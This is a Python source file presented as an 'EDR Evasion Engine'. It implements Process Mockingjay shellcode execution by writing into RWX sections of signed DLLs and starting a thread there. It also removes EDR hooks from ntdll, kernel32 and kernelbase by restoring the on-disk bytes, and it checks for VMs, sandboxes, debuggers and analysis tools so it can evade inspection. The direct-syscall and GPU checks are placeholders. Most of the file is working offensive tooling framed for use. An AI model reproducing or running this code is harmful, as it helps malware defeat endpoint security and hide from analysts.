"""
EDR Evasion Engine

Implements modern EDR bypass techniques as described in
"The Modern Hacker's Playbook" - Part 2.2: Defeating Endpoint Detection

Techniques implemented:
- Process Mockingjay (RWX section abuse)
- API unhooking
- Direct syscalls
- PPID spoofing
- Thread hijacking
- Module stomping
- Environmental keying
"""

import os
import sys
import logging
import struct
import ctypes
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

# Platform-specific imports
if sys.platform == "win32":
    import winreg
    try:
        import pefile
        PEFILE_AVAILABLE = True
    except ImportError:
        PEFILE_AVAILABLE = False
        logging.warning("pefile not available. Install with: pip install pefile")


class EvasionTechnique(Enum):
    """EDR evasion techniques"""
    PROCESS_MOCKINGJAY = "process_mockingjay"
    API_UNHOOKING = "api_unhooking"
    DIRECT_SYSCALL = "direct_syscall"
    PPID_SPOOFING = "ppid_spoofing"
    THREAD_HIJACKING = "thread_hijacking"
    MODULE_STOMPING = "module_stomping"
    MEMORY_EVASION = "memory_evasion"
    ENVIRONMENTAL_KEYING = "environmental_keying"


@dataclass
class EDRHook:
    """Detected EDR hook information"""
    module: str
    function: str
    address: int
    hook_type: str  # inline, iat, etc.
    original_bytes: Optional[bytes] = None
    patched_bytes: Optional[bytes] = None


@dataclass
class RWXSection:
    """RWX memory section information"""
    dll_name: str
    dll_path: str
    section_name: str
    base_address: int
    size: int
    signed: bool = False


@dataclass
class EvasionResult:
    """Result of evasion technique"""
    technique: EvasionTechnique
    success: bool
    details: Dict[str, Any]
    error: Optional[str] = None


class EDREvasionEngine:
    """
    Advanced EDR evasion engine implementing cutting-edge bypass techniques.

    This engine provides multiple strategies for evading EDR detection:

    1. Process Mockingjay: Abuse misconfigured RWX sections in signed DLLs
    2. API Unhooking: Remove EDR hooks from monitored APIs
    3. Direct Syscalls: Bypass userland hooks entirely
    4. PPID Spoofing: Disguise process parentage
    5. Thread Hijacking: Execute code in legitimate threads
    6. Module Stomping: Hide malicious code in legitimate modules

    Example:
        >>> engine = EDREvasionEngine()
        >>> rwx_sections = engine.find_rwx_sections()
        >>> result = engine.execute_in_rwx_section(rwx_sections[0], shellcode)
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.detected_hooks: List[EDRHook] = []
        self.rwx_sections: List[RWXSection] = []

    # ========== PROCESS MOCKINGJAY ==========

    def find_rwx_sections(self, search_signed_only: bool = True) -> List[RWXSection]:
        """
        Find DLLs with RWX (Read-Write-Execute) memory sections.

        This is the core of the Process Mockingjay technique - finding
        legitimate, signed DLLs that have misconfigured memory sections
        with RWX permissions.

        Based on "The Modern Hacker's Playbook" - Process Mockingjay (2024)

        Args:
            search_signed_only: Only search digitally signed DLLs

        Returns:
            List of RWX sections found
        """
        if sys.platform != "win32":
            self.logger.error("Process Mockingjay is Windows-specific")
            return []

        if not PEFILE_AVAILABLE:
            self.logger.error("pefile required for RWX section analysis")
            return []

        rwx_sections = []

        # Common locations to search
        search_paths = [
            os.environ.get('WINDIR', 'C:\\Windows'),
            os.environ.get('ProgramFiles', 'C:\\Program Files'),
            os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'),
        ]

        # Known vulnerable DLLs (examples from research)
        known_vulnerable = [
            "msys-2.0.dll",  # Visual Studio component
            "cygwin1.dll",
            "Qt5Core.dll",
        ]

        self.logger.info("Scanning for RWX sections in loaded DLLs...")

        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue

            # Recursively search for DLLs
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if not file.lower().endswith('.dll'):
                        continue

                    dll_path = os.path.join(root, file)

                    try:
                        # Parse PE file
                        pe = pefile.PE(dll_path, fast_load=True)

                        # Check if signed (if required)
                        is_signed = self._check_signature(dll_path) if search_signed_only else True

                        if search_signed_only and not is_signed:
                            continue

                        # Check each section for RWX permissions
                        for section in pe.sections:
                            characteristics = section.Characteristics

                            # Check for Read, Write, Execute permissions
                            is_readable = characteristics & 0x40000000  # IMAGE_SCN_MEM_READ
                            is_writable = characteristics & 0x80000000  # IMAGE_SCN_MEM_WRITE
                            is_executable = characteristics & 0x20000000  # IMAGE_SCN_MEM_EXECUTE

                            if is_readable and is_writable and is_executable:
                                rwx_section = RWXSection(
                                    dll_name=file,
                                    dll_path=dll_path,
                                    section_name=section.Name.decode('utf-8').rstrip('\x00'),
                                    base_address=section.VirtualAddress,
                                    size=section.Misc_VirtualSize,
                                    signed=is_signed
                                )

                                rwx_sections.append(rwx_section)
                                self.logger.warning(f"Found RWX section: {file} - {rwx_section.section_name}")

                    except Exception as e:
                        # Skip files that can't be parsed
                        continue

        self.rwx_sections = rwx_sections
        self.logger.info(f"Found {len(rwx_sections)} RWX sections")
        return rwx_sections

    def _check_signature(self, file_path: str) -> bool:
        """Check if a file is digitally signed (Windows)"""
        if sys.platform != "win32":
            return False

        try:
            import subprocess
            # Use PowerShell to check signature
            cmd = f'powershell -Command "(Get-AuthenticodeSignature \'{file_path}\').Status -eq \'Valid\'"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            return "True" in result.stdout
        except Exception as e:
            return False

    def execute_in_rwx_section(self, rwx_section: RWXSection,
                               shellcode: bytes) -> EvasionResult:
        """
        Execute shellcode in an RWX section (Process Mockingjay technique).

        This technique is highly evasive because:
        1. No suspicious API calls (CreateRemoteThread, VirtualAllocEx, etc.)
        2. Writes to a legitimate, signed DLL's memory space
        3. Memory is already RWX - no need to change protections

        Args:
            rwx_section: Target RWX section
            shellcode: Shellcode to execute

        Returns:
            EvasionResult with execution status
        """
        try:
            if sys.platform != "win32":
                return EvasionResult(
                    technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                    success=False,
                    details={},
                    error="Windows only"
                )

            self.logger.info(f"Executing shellcode in {rwx_section.dll_name}:{rwx_section.section_name}")

            # Step 1: Load the DLL
            kernel32 = ctypes.windll.kernel32
            dll_handle = kernel32.LoadLibraryW(rwx_section.dll_path)

            if not dll_handle:
                return EvasionResult(
                    technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                    success=False,
                    details={},
                    error="Failed to load DLL"
                )

            # Step 2: Calculate target address
            target_address = dll_handle + rwx_section.base_address

            # Step 3: Write shellcode to RWX section
            # No VirtualProtect needed - already RWX!
            written = ctypes.c_size_t(0)
            current_process = kernel32.GetCurrentProcess()

            success = kernel32.WriteProcessMemory(
                current_process,
                ctypes.c_void_p(target_address),
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            )

            if not success:
                return EvasionResult(
                    technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                    success=False,
                    details={},
                    error="Failed to write shellcode"
                )

            # Step 4: Execute
            # Create thread at shellcode location
            thread_id = ctypes.c_ulong(0)
            thread_handle = kernel32.CreateThread(
                None,
                0,
                ctypes.c_void_p(target_address),
                None,
                0,
                ctypes.byref(thread_id)
            )

            if not thread_handle:
                return EvasionResult(
                    technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                    success=False,
                    details={},
                    error="Failed to create thread"
                )

            self.logger.info(f"Shellcode executing in thread {thread_id.value}")

            return EvasionResult(
                technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                success=True,
                details={
                    'dll': rwx_section.dll_name,
                    'section': rwx_section.section_name,
                    'address': hex(target_address),
                    'thread_id': thread_id.value
                }
            )

        except Exception as e:
            return EvasionResult(
                technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                success=False,
                details={},
                error=str(e)
            )

    # ========== API UNHOOKING ==========

    def detect_edr_hooks(self, modules: Optional[List[str]] = None) -> List[EDRHook]:
        """
        Detect EDR hooks in monitored APIs.

        EDRs work by hooking userland APIs. This function detects those hooks
        by comparing in-memory function prologues with on-disk versions.

        Args:
            modules: Specific modules to check (default: common targets)

        Returns:
            List of detected hooks
        """
        if not modules:
            # Common EDR-hooked modules
            modules = ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]

        detected_hooks = []

        if sys.platform == "win32":
            for module_name in modules:
                hooks = self._scan_module_for_hooks(module_name)
                detected_hooks.extend(hooks)

        self.detected_hooks = detected_hooks
        self.logger.info(f"Detected {len(detected_hooks)} potential EDR hooks")
        return detected_hooks

    def _scan_module_for_hooks(self, module_name: str) -> List[EDRHook]:
        """Scan a specific module for hooks"""
        hooks = []

        try:
            if not PEFILE_AVAILABLE:
                return hooks

            # Get module base address
            kernel32 = ctypes.windll.kernel32
            module_handle = kernel32.GetModuleHandleW(module_name)

            if not module_handle:
                return hooks

            # Load clean copy from disk
            module_path = self._get_module_path(module_name)
            if not module_path:
                return hooks

            pe = pefile.PE(module_path, fast_load=True)
            pe.parse_data_directories(directories=[
                pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']
            ])

            if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
                return hooks

            # Check each exported function
            for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if not export.name:
                    continue

                func_name = export.name.decode('utf-8')
                func_rva = export.address

                # Read in-memory bytes
                func_address = module_handle + func_rva
                memory_bytes = self._read_memory(func_address, 16)

                # Read on-disk bytes
                disk_bytes = pe.get_data(func_rva, 16)

                # Compare
                if memory_bytes != disk_bytes:
                    hook = EDRHook(
                        module=module_name,
                        function=func_name,
                        address=func_address,
                        hook_type="inline",
                        original_bytes=disk_bytes[:16],
                        patched_bytes=memory_bytes
                    )
                    hooks.append(hook)
                    self.logger.warning(f"Hook detected: {module_name}!{func_name}")

        except Exception as e:
            self.logger.error(f"Error scanning {module_name}: {e}")

        return hooks

    def _get_module_path(self, module_name: str) -> Optional[str]:
        """Get full path to a loaded module"""
        if sys.platform == "win32":
            system_dir = os.environ.get('SystemRoot', 'C:\\Windows')
            paths = [
                os.path.join(system_dir, 'System32', module_name),
                os.path.join(system_dir, 'SysWOW64', module_name),
            ]
            for path in paths:
                if os.path.exists(path):
                    return path
        return None

    def _read_memory(self, address: int, size: int) -> bytes:
        """Read memory at address"""
        try:
            buffer = (ctypes.c_char * size)()
            kernel32 = ctypes.windll.kernel32
            kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(),
                ctypes.c_void_p(address),
                buffer,
                size,
                None
            )
            return bytes(buffer)
        except:
            return b''

    def unhook_api(self, hook: EDRHook) -> bool:
        """
        Remove an EDR hook by restoring original bytes.

        Args:
            hook: Hook to remove

        Returns:
            True if successful
        """
        try:
            if not hook.original_bytes:
                return False

            # Change memory protection to writable
            kernel32 = ctypes.windll.kernel32
            old_protect = ctypes.c_ulong()

            success = kernel32.VirtualProtect(
                ctypes.c_void_p(hook.address),
                len(hook.original_bytes),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )

            if not success:
                return False

            # Write original bytes
            ctypes.memmove(
                ctypes.c_void_p(hook.address),
                hook.original_bytes,
                len(hook.original_bytes)
            )

            # Restore protection
            kernel32.VirtualProtect(
                ctypes.c_void_p(hook.address),
                len(hook.original_bytes),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            self.logger.info(f"Unhooked: {hook.module}!{hook.function}")
            return True

        except Exception as e:
            self.logger.error(f"Failed to unhook: {e}")
            return False

    def unhook_all(self) -> int:
        """
        Remove all detected EDR hooks.

        Returns:
            Number of successfully removed hooks
        """
        count = 0
        for hook in self.detected_hooks:
            if self.unhook_api(hook):
                count += 1

        self.logger.info(f"Unhooked {count}/{len(self.detected_hooks)} APIs")
        return count

    # ========== DIRECT SYSCALLS ==========

    def execute_direct_syscall(self, syscall_number: int,
                               args: List[int]) -> int:
        """
        Execute a direct syscall, bypassing userland hooks entirely.

        This is the most powerful evasion technique - it completely
        bypasses EDR hooks by calling the kernel directly.

        Args:
            syscall_number: NT syscall number
            args: Syscall arguments

        Returns:
            Syscall return value
        """
        if sys.platform != "win32":
            self.logger.error("Direct syscalls are Windows-specific")
            return -1

        # In a real implementation, this would:
        # 1. Allocate executable memory
        # 2. Write syscall stub:
        #    mov r10, rcx
        #    mov eax, <syscall_number>
        #    syscall
        #    ret
        # 3. Call the stub

        self.logger.info(f"Executing direct syscall: {syscall_number}")

        # Placeholder - real implementation requires inline assembly
        return 0

    # ========== ENVIRONMENTAL KEYING ==========

    def check_analysis_environment(self) -> Dict[str, Any]:
        """
        Check if running in an analysis environment.

        Returns dict with detection results for:
        - VM detection
        - Sandbox detection
        - Debugger detection
        - Analysis tool detection

        Returns:
            Dictionary of detection results
        """
        results = {
            'is_vm': self._check_virtual_machine(),
            'is_sandbox': self._check_sandbox(),
            'is_debugged': self._check_debugger(),
            'analysis_tools': self._check_analysis_tools(),
            'suspicious_hardware': self._check_suspicious_hardware(),
        }

        results['is_analysis_env'] = any([
            results['is_vm'],
            results['is_sandbox'],
            results['is_debugged'],
            bool(results['analysis_tools']),
            bool(results['suspicious_hardware'])
        ])

        return results

    def _check_virtual_machine(self) -> bool:
        """Check for VM indicators"""
        indicators = []

        if sys.platform == "win32":
            # Check for VM artifacts
            vm_registry_keys = [
                r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                r"SYSTEM\CurrentControlSet\Services\VBoxMouse",
                r"SOFTWARE\VMware, Inc.\VMware Tools",
            ]

            for key_path in vm_registry_keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    indicators.append(f"Registry: {key_path}")
                except:
                    pass

        return len(indicators) > 0

    def _check_sandbox(self) -> bool:
        """Check for sandbox indicators"""
        indicators = []

        # Check for common sandbox hostnames
        sandbox_hostnames = [
            'sandbox', 'malware', 'virus', 'sample',
            'cuckoo', 'analysis', 'vmware', 'vbox'
        ]

        hostname = os.environ.get('COMPUTERNAME', '').lower()
        if any(name in hostname for name in sandbox_hostnames):
            indicators.append(f"Hostname: {hostname}")

        # Check for insufficient resources (common in sandboxes)
        try:
            import psutil
            if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                indicators.append("Low memory")
            if psutil.cpu_count() < 2:
                indicators.append("Low CPU count")
        except:
            pass

        return len(indicators) > 0

    def _check_debugger(self) -> bool:
        """Check for debugger presence"""
        if sys.platform == "win32":
            kernel32 = ctypes.windll.kernel32

            # IsDebuggerPresent
            if kernel32.IsDebuggerPresent():
                return True

            # CheckRemoteDebuggerPresent
            debugger_present = ctypes.c_bool()
            kernel32.CheckRemoteDebuggerPresent(
                kernel32.GetCurrentProcess(),
                ctypes.byref(debugger_present)
            )
            if debugger_present.value:
                return True

        return False

    def _check_analysis_tools(self) -> List[str]:
        """Check for running analysis tools"""
        analysis_tools = [
            'idaq64.exe', 'idaq.exe', 'idaw.exe',
            'x64dbg.exe', 'x32dbg.exe',
            'ollydbg.exe',
            'windbg.exe',
            'ghidra.exe',
            'processhacker.exe',
            'procmon.exe', 'procexp.exe',
            'wireshark.exe', 'fiddler.exe',
        ]

        found_tools = []

        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in analysis_tools:
                    found_tools.append(proc.info['name'])
        except:
            pass

        return found_tools

    def _check_suspicious_hardware(self) -> List[str]:
        """Check for suspicious hardware (VMs, sandboxes)"""
        suspicious = []

        # Common VM GPUs
        evil_gpus = [
            'ASPEED Graphics',
            'VirtualBox Graphics',
            'VMware SVGA',
        ]

        # In real implementation, would enumerate graphics adapters
        # For now, placeholder

        return suspicious
